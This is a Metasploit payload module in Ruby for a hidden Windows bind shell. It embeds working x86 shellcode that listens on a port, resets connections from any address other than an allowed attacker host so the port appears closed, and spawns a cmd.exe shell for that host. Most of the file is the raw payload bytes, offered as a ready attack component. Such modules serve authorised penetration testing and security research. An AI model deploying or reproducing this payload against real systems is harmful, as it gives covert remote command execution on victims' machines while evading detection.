##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 386

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows Command Shell, Hidden Bind TCP Inline',
        'Description' => %q{
          Listen for a connection from certain IP and spawn a command shell.
          The shellcode will reply with a RST packet if the connections is not
          coming from the IP defined in AHOST. This way the port will appear
          as "closed" helping us to hide the shellcode.
        },
        'Author' => [
          'vlad902', # original payload module (single_shell_bind_tcp)
          'sd', # original payload module (single_shell_bind_tcp)
          'Borja Merino <bmerinofe[at]gmail.com>' # Add Hidden ACL functionality
        ],
        'License' => MSF_LICENSE,
        'References' => [['URL', 'http://www.shelliscoming.com/2014/03/hidden-bind-shell-keep-your-shellcode.html']],
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'Payload' => {
          'Offsets' =>
                  {
                    'LPORT' => [ 193, 'n' ],
                    'AHOST' => [ 255, 'ADDR' ],
                    'EXITFUNC' => [ 356, 'V' ]
                  },
          'Payload' =>
                       "\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B" \
                       "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C" \
                       "\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52" \
                       "\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20" \
                       "\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC" \
                       "\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75" \
                       "\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3" \
                       "\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF" \
                       "\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77" \
                       "\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00" \
                       "\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x50\x50\x50\x50\x40" \
                       "\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x31\xDB\x53\x68\x02" \
                       "\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5" \
                       "\x6A\x01\x54\x68\x02\x30\x00\x00\x68\xFF\xFF\x00\x00\x57\x68\xF1" \
                       "\xA2\x77\x29\xFF\xD5\x53\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x53\xE8" \
                       "\x17\x00\x00\x00\x8B\x44\x24\x04\x8B\x40\x04\x8B\x40\x04\x2D\xC0" \
                       "\xA8\x01\x21\x74\x03\x31\xC0\x40\xC2\x20\x00\x53\x53\x57\x68\x94" \
                       "\xAC\xBE\x33\xFF\xD5\x40\x74\xD6\x48\x57\x97\x68\x75\x6E\x4D\x61" \
                       "\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12" \
                       "\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6" \
                       "\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79" \
                       "\xCC\x3F\x86\xFF\xD5\x89\xE0\x4E\x56\x46\xFF\x30\x68\x08\x87\x1D" \
                       "\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C" \
                       "\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53" \
                       "\xFF\xD5"
        }
      )
    )

    register_options([
      OptAddress.new('AHOST', [true, 'IP address allowed', nil])
    ])
  end
end
